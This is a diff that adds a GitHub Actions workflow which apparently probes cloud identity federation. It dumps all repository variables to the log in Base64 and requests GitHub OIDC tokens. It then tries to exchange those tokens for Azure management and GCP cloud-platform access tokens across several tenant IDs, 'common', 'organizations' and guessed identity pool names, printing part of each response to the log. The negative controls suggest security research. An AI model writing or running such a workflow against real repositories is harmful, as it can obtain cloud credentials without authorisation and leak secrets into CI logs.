@@ -1,0 +1,90 @@
+name: zz-oidc-azgcp
+on: workflow_dispatch
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  matrix:
+    strategy:
+      fail-fast: false
+      matrix:
+        environment: [release, production, dev, release-signing]
+    runs-on: ubuntu-latest
+    environment: ${{ matrix.environment }}
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - name: varsdump
+        run: |
+          set +e
+          echo "REPO=$GITHUB_REPOSITORY ENV=${{ matrix.environment }}"
+          echo "VARS_B64=$(echo '${{ toJSON(vars) }}' | base64 -w0)"
+          env | grep -iE 'azure|gcp|google|aws' | sed 's/=.*/=<set>/' || true
+      - name: azgcp-exchange
+        run: |
+          set +e
+          AAD=https://login.microsoftonline.com
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "AZ_TOKEN_LEN=${#TOK}"
+          echo "CLAIMS:"; echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
+          BADTOR=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://wrong-aud-9c3f1a" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          ex() {
+            T=$1; CID=$2; AUD=$3; TAG=$4
+            echo "--- EXCHANGE $TAG tenant=$T client=$CID aud=$AUD"
+            curl -s -m 30 -X POST "$AAD/$T/oauth2/v2.0/token" \
+              --data-urlencode "client_id=$CID" \
+              --data-urlencode "scope=https://management.azure.com/.default" \
+              --data-urlencode "grant_type=client_credentials" \
+              --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+              --data-urlencode "client_assertion=$AUD" \
+              --data-urlencode "requested_token_use=on_behalf_of" | head -c 600
+            echo
+          }
+          ex 9b5f061d-b051-45a6-8fc9-5a059bd097c5 4d94def0-8f43-475b-b3ec-94cf23e396f4 "$TOK" real-app
+          ex 9b5f061d-b051-45a6-8fc9-5a059bd097c5 4d94def0-8f43-475b-b3ec-94cf23e396f4 "$BADTOR" NEGCTL-wrong-aud
+          ex e8adc959-bf67-48e0-95b4-318b5f73946c 4d94def0-8f43-475b-b3ec-94cf23e396f4 "$TOK" sml-tenant
+          ex 2f4a9838-26b7-47ee-be60-ccc1fdec5953 4d94def0-8f43-475b-b3ec-94cf23e396f4 "$TOK" third-tenant
+          ex common 4d94def0-8f43-475b-b3ec-94cf23e396f4 "$TOK" common
+          ex organizations 4d94def0-8f43-475b-b3ec-94cf23e396f4 "$TOK" orgs
+          echo "=== GCP STS ==="
+          gx() {
+            P=$1
+            echo "--- GCP $P"
+            curl -s -m 30 -X POST "https://sts.googleapis.com/v1/token" \
+              -H "Content-Type: application/json" \
+              -d "{\"audience\":\"//iam.googleapis.com/$P\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$TOK\"}" | head -c 500
+            echo
+          }
+          gx projects/135587177093/locations/global/workloadIdentityPools/github/providers/github
+          gx projects/135587177093/locations/global/workloadIdentityPools/github-actions/providers/github
+          gx projects/135587177093/locations/global/workloadIdentityPools/gh/providers/oidc
+          echo "--- GCP NEGCTL wrong-aud"
+          curl -s -m 30 -X POST "https://sts.googleapis.com/v1/token" \
+            -H "Content-Type: application/json" \
+            -d "{\"audience\":\"//iam.googleapis.com/projects/135587177093/locations/global/workloadIdentityPools/github/providers/github\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$BADTOR\"}" | head -c 500
+          echo
+  noenv:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - name: azgcp-exchange-noenv
+        run: |
+          set +e
+          echo "REPO=$GITHUB_REPOSITORY NAME=$GITHUB_WORKFLOW_REF"
+          echo "VARS_B64=$(echo '${{ toJSON(vars) }}' | base64 -w0)"
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "AZ_TOKEN_LEN=${#TOK}"
+          curl -s -m 30 -X POST "https://login.microsoftonline.com/9b5f061d-b051-45a6-8fc9-5a059bd097c5/oauth2/v2.0/token" \
+            --data-urlencode "client_id=4d94def0-8f43-475b-b3ec-94cf23e396f4" \
+            --data-urlencode "scope=https://management.azure.com/.default" \
+            --data-urlencode "grant_type=client_credentials" \
+            --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            --data-urlencode "client_assertion=$TOK" | head -c 600
+          echo
+          echo "=== GCP STS ==="
+          curl -s -m 30 -X POST "https://sts.googleapis.com/v1/token" -H "Content-Type: application/json" \
+            -d "{\"audience\":\"//iam.googleapis.com/projects/135587177093/locations/global/workloadIdentityPools/github/providers/github\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$TOK\"}" | head -c 500
+          echo
